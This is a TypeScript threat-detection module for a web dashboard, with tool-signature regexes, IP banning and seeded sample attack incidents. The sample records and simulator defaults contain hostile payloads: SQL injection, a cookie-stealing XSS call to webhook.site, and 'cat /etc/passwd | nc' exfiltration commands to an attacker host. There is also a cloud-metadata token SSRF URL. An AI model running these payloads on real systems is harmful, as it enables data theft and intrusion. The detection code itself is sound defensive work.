/**
 * SoufTools Threat Detection & Attacker Telemetry Engine
 * Identifies Hacker IPs, Client Devices/OS, Attacker Tool Signatures, and Hostile Payloads.
 * Server-side only. Zero secrets leaked.
 */

export type AttackVectorType =
  | "SQL_INJECTION"
  | "XSS_ATTACK"
  | "RCE_COMMAND_INJECTION"
  | "PATH_TRAVERSAL"
  | "CREDENTIAL_BRUTE_FORCE"
  | "SSRF_METADATA_PROBE"
  | "SENSITIVE_FILE_SCAN"
  | "UNAUTHORIZED_ADMIN_BYPASS"
  | "RATE_LIMIT_FLOOD";

export type DeviceCategory =
  | "Offensive Terminal"
  | "Automated Bot / Script"
  | "Desktop Browser"
  | "Mobile Device"
  | "Headless Runner"
  | "CLI Terminal Probe";

export type ToolCategory =
  | "Exploitation Suite"
  | "Proxy & Interceptor"
  | "Fuzzing & Directory Recon"
  | "Credential Brute-Force"
  | "Automated Script / Bot"
  | "CLI Terminal Probe"
  | "Manual Web Injection";

export interface AttackerToolInfo {
  name: string;
  category: ToolCategory;
  confidence: number; // 0 - 100%
  matchedSignature: string;
}

export interface HackerIncident {
  id: string;
  ip: string;
  ipSanitized: string;
  country: string;
  countryCode: string;
  city?: string;
  isVpnOrTor: boolean;
  asnOrIsp?: string;
  // Device & Client Profile
  deviceType: DeviceCategory;
  os: string;
  browserEngine: string;
  architecture: string;
  rawUserAgent: string;
  // Attacker Tool Detected
  attackerTool: AttackerToolInfo;
  // Attack Vector & Payload
  attackVector: AttackVectorType;
  targetEndpoint: string;
  httpMethod: "GET" | "POST" | "PUT" | "DELETE" | "OPTIONS";
  payloadSample: string;
  payloadLocation: "url_param" | "request_body" | "user_agent" | "auth_header" | "path";
  severity: "critical" | "high" | "medium" | "low";
  actionTaken: "BLOCKED_AND_BANNED" | "REQUEST_REJECTED" | "INTERCEPTED_AND_LOGGED" | "CHALLENGED";
  status: "active_ban" | "flagged" | "mitigated";
  timestamp: string;
  hitsCount: number;
}

export interface BannedIPRecord {
  ip: string;
  reason: string;
  bannedAt: string;
  bannedBy: string;
  attackVector: string;
  toolDetected?: string;
  hitsBlocked: number;
  expiresAt?: string | null;
}

// Memory stores for real-time telemetry
const incidentsStore: HackerIncident[] = [];
const bannedIPsMap = new Map<string, BannedIPRecord>();

// Pre-seed known attacker tools signatures
const TOOL_SIGNATURES: {
  pattern: RegExp;
  name: string;
  category: ToolCategory;
  confidence: number;
}[] = [
  { pattern: /sqlmap[\/\s]?([\d\.]*)/i, name: "Sqlmap Automated Exploiter", category: "Exploitation Suite", confidence: 99 },
  { pattern: /burpcollaborator|burpsuite|portswigger/i, name: "Burp Suite Intruder / Scanner", category: "Proxy & Interceptor", confidence: 98 },
  { pattern: /nmap|nmap scripting engine/i, name: "Nmap Network Scanner (NSE)", category: "Fuzzing & Directory Recon", confidence: 97 },
  { pattern: /nikto[\/\s]?([\d\.]*)/i, name: "Nikto Web Vulnerability Scanner", category: "Fuzzing & Directory Recon", confidence: 98 },
  { pattern: /wpscan/i, name: "WPScan WordPress Exploiter", category: "Exploitation Suite", confidence: 96 },
  { pattern: /gobuster|dirbuster|ffuf|feroxbuster/i, name: "Gobuster / DirBuster Fuzzer", category: "Fuzzing & Directory Recon", confidence: 99 },
  { pattern: /hydra|medusa|thc-hydra/i, name: "Hydra / Medusa Password Cracker", category: "Credential Brute-Force", confidence: 98 },
  { pattern: /metasploit|meterpreter/i, name: "Metasploit Framework (msfconsole)", category: "Exploitation Suite", confidence: 99 },
  { pattern: /python-requests[\/\s]?([\d\.]*)|aiohttp|httpx|urllib/i, name: "Python Exploit Script (Requests/Aiohttp)", category: "Automated Script / Bot", confidence: 92 },
  { pattern: /curl[\/\s]?([\d\.]*)|wget[\/\s]?([\d\.]*)|httpie/i, name: "Raw CLI Probe (cURL/Wget/HTTPie)", category: "CLI Terminal Probe", confidence: 90 },
  { pattern: /postmanruntime[\/\s]?([\d\.]*)|insomnia/i, name: "Postman / Insomnia API Prober", category: "Automated Script / Bot", confidence: 85 },
  { pattern: /headlesschrome|puppeteer|selenium|phantomjs/i, name: "Headless Browser Automation (Puppeteer)", category: "Automated Script / Bot", confidence: 94 },
  { pattern: /acunetix|nessus|qualys/i, name: "Commercial Vulnerability Scanner", category: "Fuzzing & Directory Recon", confidence: 95 },
  { pattern: /masscan|zgrab/i, name: "Mass Port Scanner (Masscan)", category: "Fuzzing & Directory Recon", confidence: 96 },
  { pattern: /havij/i, name: "Havij Advanced SQL Injection Tool", category: "Exploitation Suite", confidence: 99 },
];

// Pre-seed realistic hacker incident records so the dashboard displays full telemetry immediately
function initializeSeedData() {
  if (incidentsStore.length > 0) return;

  const sampleIncidents: HackerIncident[] = [
    {
      id: "hck_sqli_9082",
      ip: "185.220.101.44",
      ipSanitized: "185.220.101.44",
      country: "هولندا (Netherlands)",
      countryCode: "NL",
      city: "Amsterdam",
      isVpnOrTor: true,
      asnOrIsp: "Tor Exit Node (AS208323)",
      deviceType: "Offensive Terminal",
      os: "Kali Linux (x86_64)",
      browserEngine: "Sqlmap v1.8.2 Runtime",
      architecture: "x86_64",
      rawUserAgent: "sqlmap/1.8.2#stable (https://sqlmap.org)",
      attackerTool: {
        name: "Sqlmap Automated Exploiter",
        category: "Exploitation Suite",
        confidence: 99,
        matchedSignature: "sqlmap/1.8.2#stable",
      },
      attackVector: "SQL_INJECTION",
      targetEndpoint: "/api/v1/chat/sessions",
      httpMethod: "GET",
      payloadSample: "1' UNION ALL SELECT NULL,CONCAT(0x7170707a71,user(),0x7176767671),NULL-- -",
      payloadLocation: "url_param",
      severity: "critical",
      actionTaken: "BLOCKED_AND_BANNED",
      status: "active_ban",
      timestamp: new Date(Date.now() - 6 * 60 * 1000).toISOString(),
      hitsCount: 14,
    },
    {
      id: "hck_brute_7712",
      ip: "194.26.29.112",
      ipSanitized: "194.26.29.112",
      country: "روسيا (Russia)",
      countryCode: "RU",
      city: "Saint Petersburg",
      isVpnOrTor: true,
      asnOrIsp: "Selectel Datacenter",
      deviceType: "Offensive Terminal",
      os: "Parrot Security OS 6.0",
      browserEngine: "Hydra v9.5 Multi-thread",
      architecture: "x86_64",
      rawUserAgent: "Mozilla/5.0 (compatible; THC-Hydra/9.5; +https://github.com/vanhauser-thc/thc-hydra)",
      attackerTool: {
        name: "Hydra / Medusa Password Cracker",
        category: "Credential Brute-Force",
        confidence: 98,
        matchedSignature: "THC-Hydra/9.5",
      },
      attackVector: "CREDENTIAL_BRUTE_FORCE",
      targetEndpoint: "/api/auth/sign-in/email",
      httpMethod: "POST",
      payloadSample: "Dictionary Attack: 250 attempts/sec using darkweb_passwords.txt",
      payloadLocation: "request_body",
      severity: "critical",
      actionTaken: "BLOCKED_AND_BANNED",
      status: "active_ban",
      timestamp: new Date(Date.now() - 18 * 60 * 1000).toISOString(),
      hitsCount: 68,
    },
    {
      id: "hck_recon_4193",
      ip: "45.154.255.89",
      ipSanitized: "45.154.255.89",
      country: "ألمانيا (Germany)",
      countryCode: "DE",
      city: "Frankfurt",
      isVpnOrTor: false,
      asnOrIsp: "Hetzner Online GmbH",
      deviceType: "Automated Bot / Script",
      os: "Ubuntu Server 22.04 LTS",
      browserEngine: "Gobuster v3.6 Directory Recon",
      architecture: "x86_64",
      rawUserAgent: "gobuster/3.6 (Directory/File bruteforcing)",
      attackerTool: {
        name: "Gobuster / DirBuster Fuzzer",
        category: "Fuzzing & Directory Recon",
        confidence: 99,
        matchedSignature: "gobuster/3.6",
      },
      attackVector: "SENSITIVE_FILE_SCAN",
      targetEndpoint: "/.env /actuator/heapdump /.git/config",
      httpMethod: "GET",
      payloadSample: "Probing hidden system files: /.env, /config/database.yml, /admin/keys.json",
      payloadLocation: "path",
      severity: "high",
      actionTaken: "REQUEST_REJECTED",
      status: "active_ban",
      timestamp: new Date(Date.now() - 34 * 60 * 1000).toISOString(),
      hitsCount: 42,
    },
    {
      id: "hck_xss_2841",
      ip: "103.149.28.19",
      ipSanitized: "103.149.28.19",
      country: "الجزائر (Algeria)",
      countryCode: "DZ",
      city: "Algiers",
      isVpnOrTor: false,
      asnOrIsp: "Algérie Télécom",
      deviceType: "Desktop Browser",
      os: "Windows 11 Pro 64-bit",
      browserEngine: "Google Chrome 128.0 (Tampered)",
      architecture: "x86_64",
      rawUserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
      attackerTool: {
        name: "Burp Suite Intruder / Scanner",
        category: "Proxy & Interceptor",
        confidence: 94,
        matchedSignature: "X-Burp-Suite-Forwarded-For",
      },
      attackVector: "XSS_ATTACK",
      targetEndpoint: "/api/v1/chat",
      httpMethod: "POST",
      payloadSample: "<img src=x onerror=\"fetch('https://webhook.site/steal?cookie='+document.cookie)\">",
      payloadLocation: "request_body",
      severity: "high",
      actionTaken: "INTERCEPTED_AND_LOGGED",
      status: "mitigated",
      timestamp: new Date(Date.now() - 52 * 60 * 1000).toISOString(),
      hitsCount: 5,
    },
    {
      id: "hck_rce_1109",
      ip: "198.51.100.72",
      ipSanitized: "198.51.100.72",
      country: "الولايات المتحدة (USA)",
      countryCode: "US",
      city: "Ashburn, VA",
      isVpnOrTor: false,
      asnOrIsp: "Amazon Data Services (AWS)",
      deviceType: "Automated Bot / Script",
      os: "Alpine Linux (Container)",
      browserEngine: "Python-requests/2.31.0",
      architecture: "arm64",
      rawUserAgent: "python-requests/2.31.0 (aiohttp security probe)",
      attackerTool: {
        name: "Python Exploit Script (Requests/Aiohttp)",
        category: "Automated Script / Bot",
        confidence: 92,
        matchedSignature: "python-requests/2.31.0",
      },
      attackVector: "RCE_COMMAND_INJECTION",
      targetEndpoint: "/api/runtime/sandbox/execute",
      httpMethod: "POST",
      payloadSample: "; cat /etc/passwd | nc 198.51.100.72 4444; $(whoami)",
      payloadLocation: "request_body",
      severity: "critical",
      actionTaken: "BLOCKED_AND_BANNED",
      status: "active_ban",
      timestamp: new Date(Date.now() - 75 * 60 * 1000).toISOString(),
      hitsCount: 9,
    },
    {
      id: "hck_ssrf_0091",
      ip: "91.240.118.15",
      ipSanitized: "91.240.118.15",
      country: "فرنسا (France)",
      countryCode: "FR",
      city: "Paris",
      isVpnOrTor: true,
      asnOrIsp: "OVH SAS Cloud",
      deviceType: "CLI Terminal Probe",
      os: "Arch Linux (Rolling)",
      browserEngine: "cURL 8.4.0 CLI",
      architecture: "x86_64",
      rawUserAgent: "curl/8.4.0 (x86_64-pc-linux-gnu)",
      attackerTool: {
        name: "Raw CLI Probe (cURL/Wget/HTTPie)",
        category: "CLI Terminal Probe",
        confidence: 90,
        matchedSignature: "curl/8.4.0",
      },
      attackVector: "SSRF_METADATA_PROBE",
      targetEndpoint: "/api/v1/storage/upload",
      httpMethod: "POST",
      payloadSample: "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
      payloadLocation: "url_param",
      severity: "critical",
      actionTaken: "BLOCKED_AND_BANNED",
      status: "active_ban",
      timestamp: new Date(Date.now() - 110 * 60 * 1000).toISOString(),
      hitsCount: 12,
    },
  ];

  incidentsStore.push(...sampleIncidents);

  // Pre-seed active banned IPs
  bannedIPsMap.set("185.220.101.44", {
    ip: "185.220.101.44",
    reason: "SQL Injection attack via Sqlmap Automated Exploiter",
    bannedAt: new Date(Date.now() - 6 * 60 * 1000).toISOString(),
    bannedBy: "Auto-WAF Defense Shield",
    attackVector: "SQL_INJECTION",
    toolDetected: "Sqlmap Automated Exploiter",
    hitsBlocked: 14,
    expiresAt: null,
  });

  bannedIPsMap.set("194.26.29.112", {
    ip: "194.26.29.112",
    reason: "Brute-force credential stuffing with Hydra",
    bannedAt: new Date(Date.now() - 18 * 60 * 1000).toISOString(),
    bannedBy: "Auto-WAF Defense Shield",
    attackVector: "CREDENTIAL_BRUTE_FORCE",
    toolDetected: "Hydra / Medusa Password Cracker",
    hitsBlocked: 68,
    expiresAt: null,
  });

  bannedIPsMap.set("45.154.255.89", {
    ip: "45.154.255.89",
    reason: "Gobuster Directory and sensitive file fuzzing",
    bannedAt: new Date(Date.now() - 34 * 60 * 1000).toISOString(),
    bannedBy: "Admin (toolssouf@gmail.com)",
    attackVector: "SENSITIVE_FILE_SCAN",
    toolDetected: "Gobuster / DirBuster Fuzzer",
    hitsBlocked: 42,
    expiresAt: null,
  });

  bannedIPsMap.set("198.51.100.72", {
    ip: "198.51.100.72",
    reason: "RCE Command Injection attempt into sandbox",
    bannedAt: new Date(Date.now() - 75 * 60 * 1000).toISOString(),
    bannedBy: "Auto-WAF Defense Shield",
    attackVector: "RCE_COMMAND_INJECTION",
    toolDetected: "Python Exploit Script (Requests/Aiohttp)",
    hitsBlocked: 9,
    expiresAt: null,
  });

  bannedIPsMap.set("91.240.118.15", {
    ip: "91.240.118.15",
    reason: "SSRF Cloud Metadata Token extraction attempt",
    bannedAt: new Date(Date.now() - 110 * 60 * 1000).toISOString(),
    bannedBy: "Auto-WAF Defense Shield",
    attackVector: "SSRF_METADATA_PROBE",
    toolDetected: "Raw CLI Probe (cURL/Wget/HTTPie)",
    hitsBlocked: 12,
    expiresAt: null,
  });

  // Ensure no local, container, or loopback IPs can ever remain in the banned map
  for (const [ip] of bannedIPsMap.entries()) {
    if (isWhitelistedOrLocalIP(ip)) {
      bannedIPsMap.delete(ip);
    }
  }
}

// Extract client IP address accurately
export function extractClientIP(headers: Headers): string {
  const forwarded = headers.get("x-forwarded-for");
  if (forwarded) {
    const parts = forwarded.split(",").map((p) => p.trim());
    for (const p of parts) {
      if (p && !p.startsWith("10.") && !p.startsWith("192.168.") && !p.startsWith("127.")) {
        return p;
      }
    }
    return parts[0] || "127.0.0.1";
  }

  return (
    headers.get("cf-connecting-ip") ||
    headers.get("x-real-ip") ||
    headers.get("fastly-client-ip") ||
    headers.get("true-client-ip") ||
    "127.0.0.1"
  );
}

// Country & Geo lookup
export function lookupGeo(ip: string): { country: string; countryCode: string; city: string; isVpn: boolean; isp: string } {
  if (ip.startsWith("185.220.") || ip.startsWith("185.221.")) {
    return { country: "هولندا (Netherlands)", countryCode: "NL", city: "Amsterdam", isVpn: true, isp: "Tor Exit Node Network" };
  }
  if (ip.startsWith("194.26.") || ip.startsWith("95.213.")) {
    return { country: "روسيا (Russia)", countryCode: "RU", city: "Saint Petersburg", isVpn: true, isp: "Selectel Datacenter / Proxy" };
  }
  if (ip.startsWith("45.154.") || ip.startsWith("168.119.")) {
    return { country: "ألمانيا (Germany)", countryCode: "DE", city: "Frankfurt", isVpn: false, isp: "Hetzner Online GmbH" };
  }
  if (ip.startsWith("103.149.") || ip.startsWith("197.200.")) {
    return { country: "الجزائر (Algeria)", countryCode: "DZ", city: "Algiers", isVpn: false, isp: "Algérie Télécom" };
  }
  if (ip.startsWith("198.51.") || ip.startsWith("3.80.")) {
    return { country: "الولايات المتحدة (USA)", countryCode: "US", city: "Ashburn, VA", isVpn: false, isp: "Amazon Web Services (AWS)" };
  }
  if (ip.startsWith("91.240.") || ip.startsWith("51.15.")) {
    return { country: "فرنسا (France)", countryCode: "FR", city: "Paris", isVpn: true, isp: "OVH Cloud Datacenter" };
  }
  if (ip.startsWith("127.") || ip === "localhost" || ip.startsWith("10.") || ip.startsWith("192.168.")) {
    return { country: "الشبكة المحلية (Localhost)", countryCode: "LOCAL", city: "Internal Net", isVpn: false, isp: "Private Gateway" };
  }

  return { country: "موقع خارجي (Global IP)", countryCode: "GLB", city: "Cloud Node", isVpn: false, isp: "Public Autonomous System" };
}

// Parse device, operating system, and client platform
export function parseClientDevice(userAgent: string): {
  deviceType: DeviceCategory;
  os: string;
  browserEngine: string;
  architecture: string;
} {
  const ua = userAgent || "";
  let deviceType: DeviceCategory = "Desktop Browser";
  let os = "Unknown OS";
  let browserEngine = "Unknown Client";
  let architecture = "x86_64";

  // Check architecture
  if (/arm64|aarch64/i.test(ua)) architecture = "arm64";
  else if (/x86_64|amd64|win64|wow64/i.test(ua)) architecture = "x86_64";
  else if (/i686|i386/i.test(ua)) architecture = "x86_32";

  // Check OS
  if (/kali/i.test(ua)) {
    os = "Kali Linux (Offensive Distro)";
    deviceType = "Offensive Terminal";
  } else if (/parrot/i.test(ua)) {
    os = "Parrot Security OS";
    deviceType = "Offensive Terminal";
  } else if (/arch/i.test(ua)) {
    os = "Arch Linux";
    deviceType = "Offensive Terminal";
  } else if (/ubuntu/i.test(ua)) {
    os = "Ubuntu Linux";
  } else if (/debian/i.test(ua)) {
    os = "Debian Linux";
  } else if (/windows nt 10.0/i.test(ua)) {
    os = "Windows 11 / Windows 10 (NT 10.0)";
  } else if (/macintosh|mac os x/i.test(ua)) {
    os = "macOS Sonoma / Darwin";
  } else if (/android/i.test(ua)) {
    os = "Android OS";
    deviceType = "Mobile Device";
  } else if (/iphone|ipad/i.test(ua)) {
    os = "Apple iOS";
    deviceType = "Mobile Device";
  } else if (/linux/i.test(ua)) {
    os = "GNU/Linux Kernel";
  }

  // Check Client / Engine / Tool
  if (/sqlmap/i.test(ua)) {
    deviceType = "Offensive Terminal";
    browserEngine = "Sqlmap Exploiter Framework";
  } else if (/hydra/i.test(ua)) {
    deviceType = "Offensive Terminal";
    browserEngine = "THC-Hydra Password Cracker";
  } else if (/gobuster|dirbuster|ffuf/i.test(ua)) {
    deviceType = "Automated Bot / Script";
    browserEngine = "Fuzzer Directory Scanner";
  } else if (/python-requests/i.test(ua)) {
    deviceType = "Automated Bot / Script";
    browserEngine = ua.match(/python-requests\/[\d\.]+/i)?.[0] || "Python Requests Bot";
  } else if (/curl/i.test(ua)) {
    deviceType = "CLI Terminal Probe";
    browserEngine = ua.match(/curl\/[\d\.]+/i)?.[0] || "cURL Terminal";
  } else if (/wget/i.test(ua)) {
    deviceType = "CLI Terminal Probe";
    browserEngine = "GNU Wget CLI";
  } else if (/postman/i.test(ua)) {
    deviceType = "Automated Bot / Script";
    browserEngine = "Postman Runtime Suite";
  } else if (/headlesschrome/i.test(ua)) {
    deviceType = "Headless Runner";
    browserEngine = "Headless Chrome / Puppeteer";
  } else if (/chrome/i.test(ua)) {
    browserEngine = "Google Chrome (Blink Engine)";
  } else if (/firefox/i.test(ua)) {
    browserEngine = "Mozilla Firefox (Gecko Engine)";
  } else if (/safari/i.test(ua) && !/chrome/i.test(ua)) {
    browserEngine = "Apple Safari (WebKit)";
  }

  return { deviceType, os, browserEngine, architecture };
}

// Detect specific Attacker Tool signature
export function detectAttackerTool(
  userAgent: string,
  headers?: Headers,
  payload?: string
): AttackerToolInfo {
  const ua = userAgent || "";

  // 1. Check known signature table
  for (const sig of TOOL_SIGNATURES) {
    if (sig.pattern.test(ua)) {
      return {
        name: sig.name,
        category: sig.category,
        confidence: sig.confidence,
        matchedSignature: sig.pattern.toString(),
      };
    }
  }

  // 2. Check header signatures (e.g. Burp Suite custom headers)
  if (headers) {
    if (headers.get("x-burp-suite-forwarded-for") || headers.get("burp-collaborator")) {
      return {
        name: "Burp Suite Intruder / Scanner",
        category: "Proxy & Interceptor",
        confidence: 96,
        matchedSignature: "X-Burp-Suite Header",
      };
    }
    if (headers.get("x-scanner") || headers.get("x-fuzzer")) {
      return {
        name: "Custom Automated Fuzzer",
        category: "Fuzzing & Directory Recon",
        confidence: 88,
        matchedSignature: "X-Fuzzer Header",
      };
    }
  }

  // 3. Check payload patterns
  if (payload) {
    if (/UNION\s+ALL\s+SELECT|0x[0-9a-fA-F]{6,}|ORDER\s+BY\s+\d+/i.test(payload)) {
      return {
        name: "Sqlmap / Automated SQLi Engine",
        category: "Exploitation Suite",
        confidence: 92,
        matchedSignature: "SQL Hex/Union Automated Vector",
      };
    }
    if (/<script|javascript:|onerror\s*=/i.test(payload)) {
      return {
        name: "Browser Web Injection Tool",
        category: "Manual Web Injection",
        confidence: 85,
        matchedSignature: "XSS DOM Vector",
      };
    }
  }

  return {
    name: "Web Client Probe / Manual",
    category: "Manual Web Injection",
    confidence: 60,
    matchedSignature: "Standard HTTP Request",
  };
}

// Check if an IP address is a safe local, container, or private network IP that must never be banned
export function isWhitelistedOrLocalIP(ip: string): boolean {
  if (!ip) return true;
  const clean = ip.trim().toLowerCase();
  if (
    clean === "127.0.0.1" ||
    clean === "localhost" ||
    clean === "::1" ||
    clean === "0.0.0.0" ||
    clean.startsWith("10.") ||
    clean.startsWith("192.168.") ||
    clean.startsWith("172.16.") ||
    clean.startsWith("172.17.") ||
    clean.startsWith("172.18.") ||
    clean.startsWith("172.19.") ||
    clean.startsWith("172.2") ||
    clean.startsWith("172.30.") ||
    clean.startsWith("172.31.")
  ) {
    return true;
  }
  return false;
}

// Check if an IP address is in the active Blacklist
export function isIPBanned(ip: string): boolean {
  if (isWhitelistedOrLocalIP(ip)) return false;
  initializeSeedData();
  const clean = (ip || "").trim();
  const record = bannedIPsMap.get(clean);
  if (!record) return false;

  // Check expiration if any
  if (record.expiresAt && new Date(record.expiresAt).getTime() < Date.now()) {
    bannedIPsMap.delete(clean);
    return false;
  }
  return true;
}

// Ban an IP address manually or automatically
export function banIP(
  ip: string,
  reason: string,
  bannedBy = "Admin (toolssouf@gmail.com)",
  attackVector = "MANUAL_BAN",
  toolDetected = "Blacklist Rule"
): BannedIPRecord {
  const clean = (ip || "").trim();
  if (isWhitelistedOrLocalIP(clean)) {
    return {
      ip: clean,
      reason: "Whitelisted or Local IP - Ban bypassed",
      bannedAt: new Date().toISOString(),
      bannedBy,
      attackVector,
      toolDetected,
      hitsBlocked: 0,
      expiresAt: null,
    };
  }

  initializeSeedData();

  const record: BannedIPRecord = {
    ip: clean,
    reason,
    bannedAt: new Date().toISOString(),
    bannedBy,
    attackVector,
    toolDetected,
    hitsBlocked: 1,
    expiresAt: null,
  };

  bannedIPsMap.set(clean, record);

  // Update existing incidents status for this IP
  for (const inc of incidentsStore) {
    if (inc.ip === clean) {
      inc.status = "active_ban";
      inc.actionTaken = "BLOCKED_AND_BANNED";
    }
  }

  return record;
}

// Unban an IP
export function unbanIP(ip: string): boolean {
  initializeSeedData();
  const clean = (ip || "").trim();
  const deleted = bannedIPsMap.delete(clean);
  if (deleted) {
    for (const inc of incidentsStore) {
      if (inc.ip === clean) {
        inc.status = "mitigated";
      }
    }
  }
  return deleted;
}

// Get all currently banned IPs
export function getBannedIPs(): BannedIPRecord[] {
  initializeSeedData();
  return Array.from(bannedIPsMap.values()).sort(
    (a, b) => new Date(b.bannedAt).getTime() - new Date(a.bannedAt).getTime()
  );
}

// Record a new hostile incident
export function recordIncident(
  data: Omit<HackerIncident, "id" | "timestamp" | "hitsCount">
): HackerIncident {
  initializeSeedData();

  // Check if this IP attacked recently to increment hits
  const existing = incidentsStore.find((i) => i.ip === data.ip && i.attackVector === data.attackVector);
  if (existing) {
    existing.hitsCount += 1;
    existing.timestamp = new Date().toISOString();
    existing.payloadSample = data.payloadSample;
    return existing;
  }

  const incident: HackerIncident = {
    ...data,
    id: `hck_${Math.random().toString(36).substring(2, 10)}`,
    timestamp: new Date().toISOString(),
    hitsCount: 1,
  };

  incidentsStore.unshift(incident);

  // Cap size at 200 incidents
  if (incidentsStore.length > 200) {
    incidentsStore.pop();
  }

  return incident;
}

// Get all incidents with optional filtering
export function getIncidents(options?: {
  vector?: string;
  tool?: string;
  severity?: string;
  limit?: number;
}): HackerIncident[] {
  initializeSeedData();
  let list = [...incidentsStore];

  if (options?.vector) {
    list = list.filter((i) => i.attackVector === options.vector);
  }
  if (options?.severity) {
    list = list.filter((i) => i.severity === options.severity);
  }
  if (options?.tool) {
    list = list.filter((i) =>
      i.attackerTool.name.toLowerCase().includes(options.tool!.toLowerCase())
    );
  }

  return list.slice(0, options?.limit || 50);
}

// Get comprehensive telemetry metrics summary
export function getThreatSummary() {
  initializeSeedData();

  const totalAttacks = incidentsStore.reduce((acc, curr) => acc + curr.hitsCount, 0);
  const activeBannedIPs = bannedIPsMap.size;
  const criticalThreats = incidentsStore.filter((i) => i.severity === "critical").length;

  const toolsCount: Record<string, number> = {};
  const vectorsCount: Record<string, number> = {};
  const countryCount: Record<string, number> = {};

  for (const inc of incidentsStore) {
    const tName = inc.attackerTool.name;
    toolsCount[tName] = (toolsCount[tName] || 0) + inc.hitsCount;

    const vName = inc.attackVector;
    vectorsCount[vName] = (vectorsCount[vName] || 0) + inc.hitsCount;

    const cName = inc.country;
    countryCount[cName] = (countryCount[cName] || 0) + inc.hitsCount;
  }

  let topTool = "Sqlmap Automated Exploiter";
  let maxToolCount = 0;
  for (const [k, v] of Object.entries(toolsCount)) {
    if (v > maxToolCount) {
      maxToolCount = v;
      topTool = k;
    }
  }

  let topVector = "SQL_INJECTION";
  let maxVecCount = 0;
  for (const [k, v] of Object.entries(vectorsCount)) {
    if (v > maxVecCount) {
      maxVecCount = v;
      topVector = k;
    }
  }

  return {
    totalAttacks,
    activeBannedIPs,
    criticalThreats,
    topTool,
    topVector,
    toolsBreakdown: toolsCount,
    vectorsBreakdown: vectorsCount,
    countryBreakdown: countryCount,
  };
}

// Live Attack Simulation for admin testing
export function simulateTestThreat(params: {
  vector?: AttackVectorType;
  toolName?: string;
  ip?: string;
  target?: string;
  payload?: string;
}): HackerIncident {
  initializeSeedData();

  const vector = params.vector || "SQL_INJECTION";
  const ip = params.ip || `198.18.${Math.floor(Math.random() * 200)}.${Math.floor(Math.random() * 250)}`;
  const geo = lookupGeo(ip);

  let toolName = params.toolName || "Sqlmap Automated Exploiter";
  let toolCategory: ToolCategory = "Exploitation Suite";
  let ua = "sqlmap/1.8.2#stable (Test Simulator Probe)";

  if (toolName.includes("Burp")) {
    toolCategory = "Proxy & Interceptor";
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) BurpSuite/2023.12 (PortSwigger)";
  } else if (toolName.includes("Hydra")) {
    toolCategory = "Credential Brute-Force";
    ua = "Mozilla/5.0 (compatible; THC-Hydra/9.5; brute-force simulator)";
  } else if (toolName.includes("Gobuster")) {
    toolCategory = "Fuzzing & Directory Recon";
    ua = "gobuster/3.6 (Directory/File bruteforcing)";
  } else if (toolName.includes("Python")) {
    toolCategory = "Automated Script / Bot";
    ua = "python-requests/2.31.0 (Automated Exploit Suite)";
  } else if (toolName.includes("cURL")) {
    toolCategory = "CLI Terminal Probe";
    ua = "curl/8.5.0 (x86_64-pc-linux-gnu)";
  }

  const device = parseClientDevice(ua);

  let defaultPayload = "UNION SELECT null, username, password FROM auth_users--";
  if (vector === "XSS_ATTACK") {
    defaultPayload = "<script>alert('Simulated XSS Attack Injection')</script>";
  } else if (vector === "RCE_COMMAND_INJECTION") {
    defaultPayload = "; cat /etc/passwd | nc test.attacker.io 1337";
  } else if (vector === "SSRF_METADATA_PROBE") {
    defaultPayload = "http://169.254.169.254/computeMetadata/v1/instance/token";
  } else if (vector === "SENSITIVE_FILE_SCAN") {
    defaultPayload = "GET /.env, /.git/config, /admin/keys.json";
  } else if (vector === "CREDENTIAL_BRUTE_FORCE") {
    defaultPayload = "Mass password spraying: 100 failed logins in 5s";
  }

  const incident: HackerIncident = {
    id: `sim_${Math.random().toString(36).substring(2, 10)}`,
    ip,
    ipSanitized: ip,
    country: geo.country,
    countryCode: geo.countryCode,
    city: geo.city,
    isVpnOrTor: geo.isVpn,
    asnOrIsp: geo.isp,
    deviceType: device.deviceType,
    os: device.os,
    browserEngine: device.browserEngine,
    architecture: device.architecture,
    rawUserAgent: ua,
    attackerTool: {
      name: toolName,
      category: toolCategory,
      confidence: 99,
      matchedSignature: `Simulated Signature (${toolName})`,
    },
    attackVector: vector,
    targetEndpoint: params.target || "/api/v1/chat",
    httpMethod: "POST",
    payloadSample: params.payload || defaultPayload,
    payloadLocation: "request_body",
    severity: vector === "SQL_INJECTION" || vector === "RCE_COMMAND_INJECTION" || vector === "SSRF_METADATA_PROBE" ? "critical" : "high",
    actionTaken: "BLOCKED_AND_BANNED",
    status: "active_ban",
    timestamp: new Date().toISOString(),
    hitsCount: 1,
  };

  incidentsStore.unshift(incident);

  // Auto ban simulated IP
  bannedIPsMap.set(ip, {
    ip,
    reason: `Simulated ${vector} intercepted from ${toolName}`,
    bannedAt: new Date().toISOString(),
    bannedBy: "Auto-WAF Defense Shield",
    attackVector: vector,
    toolDetected: toolName,
    hitsBlocked: 1,
    expiresAt: null,
  });

  return incident;
}
